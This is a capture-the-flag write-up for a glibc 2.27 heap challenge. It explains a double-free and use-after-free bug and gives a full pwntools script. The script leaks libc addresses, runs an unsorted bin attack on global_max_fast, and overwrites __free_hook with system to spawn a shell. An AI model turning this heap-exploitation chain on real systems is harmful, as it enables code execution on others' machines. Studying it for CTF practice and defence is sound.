Here we have a heap challenge,

base on libc-2.27.

All the protections are on.

The challenge has the traditionnal add, view, edit, delete menu..

You can allocate a maximum of 5 blocs, of size up to 0x10000 bytes.

The free function, does not zero pointers after free, and does not check if the block is already freed , so we have a double free..

The Show & Edit functions does not check if the block is already freed, so you have an UAF vulnerability also...

Seems easy, like this, but the all the allocations are processed via a malloc function that checks if the returned bloc address,

are in a range from the beginning of the heap, to 0x600000000000...

So no tcache poisonning, or any simple attack that will return us a block, in libc, or in .bss..

The solution was a unsorted bin attack on global_max_fast,

where the free of the corrupted block, will overwrite __free_hook,   with libc system funtion address.


```
from pwn import *
#context.terminal = ['lxterminal', '--title=GDB-Pwn', '--geometry=128x52', '-e']
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']
#context.log_level = 'error'

host, port = "use-after-freedom.hsc.tf", "1337"
filename = "use_after_freedom"
elf = ELF(filename)
context.arch = 'amd64'

# globals
prog_base = 0
heap_base = 0
libc_base = 0

libc = ELF('./libc.so.6')

def getConn():
   return process(filename) if not args.REMOTE else remote(host, port)


# for debugging read actual mappings values to prog_base, heap_base, libc_base... should be correct 99% of the time
def get_BASES(proc):
    global prog_base
    global libc_base
    global heap_base
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()
    i = 0
    while (not b'r--' in memory_map[i]) and (not b'r-x' in memory_map[i]) and (filename in memory_map[i]):
      i += 1
    prog_base = int(memory_map[i].split(b"-")[0],16)
    while not b'[heap]' in memory_map[i]:
      i += 1
    heap_base = int(memory_map[i].split(b"-")[0],16)
    while not (b'r--' in memory_map[i]) and (b'libc-' in memory_map[i]):
      i += 1
    libc_base = int(memory_map[i+1].split(b"-")[0],16)


def debug(bp):
    script = "source ~/gdb.plugins/gef/gef.py\n"
    get_BASES(p)
    libc.address = libc_base
    for x in bp:
        script += "b *0x%x\n"%(prog_base+x)
#    script += 'awatch *{:#x}\n'.format(libc.symbols['__free_hook'])
    script += 'directory /usr/src/glibc/glibc-2.27\n'
    script += "c\n"

    gdb.attach(p,gdbscript=script)

def add(size, data):
  p.sendlineafter('> ', '1')
  p.sendlineafter('> ', str(size))
  p.sendafter('> ', data)

def free(index):
  p.sendlineafter('> ', '2')
  p.sendlineafter('> ', str(index))

def show(index):
  p.sendlineafter('> ', '4')
  p.sendlineafter('> ', str(index))

def edit(index,data):
  p.sendlineafter('> ', '3')
  p.sendlineafter('> ', str(index))
  p.sendafter('> ', data)

p = getConn()
if not args.REMOTE and args.GDB:
	debug([0xe05])

def get_BASES(proc):
    global prog_base
    global libc_base
    global heap_base
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()
    i = 0
    while not '[heap]' in memory_map:
      i = i + 1
    heap_base = int(memory_map[i].split("-")[0],16)
    libc_base = int(memory_map[i+1].split("-")[0],16)

if args.GDB:
  print('prog base: {:#x}'.format(prog_base))
  print('heap base: {:#x}'.format(heap_base))
  low = (heap_base+0x10) & 0xffff
  libc.address = libc_base
  print('libc base: {:#x}'.format(libc.address))
  low2 = (libc.symbols['_IO_2_1_stdout_']) & 0xffff
else:
  # try arbitrary values
  low = 0xc010
  low2 = 0x6760

add(0x3940, "A")
add(0x200, "B")
free(0)
show(0)

leak = u64(p.recvline().strip() + p16(0))
log.warn("leak @ 0x%x", leak)

# global_max_fast
libc.address = leak - 0x3ebca0
log.warn("Libc base @ 0x%x", libc.address)

free(1)
edit(1, b"M"*8)
show(1)

p.recvuntil(b"M"*8)
heap = u64(p.recvline().strip() + p16(0))
log.warn("Heap leak @ 0x%x", heap)

# overwrite global_max_fast
edit(0, p64(0) + p64(libc.address + 0x3ed940 - 0x10))
add(0x3940, "Unsorted bin attack!")

free(2)

# overwrite
edit(2, p64(libc.symbols['system']))
add(0x3940, "/bin/sh")
# execute system('/bin/sh')
free(3)




p.interactive()
```

*nobodyisnobody still pwning things...
*

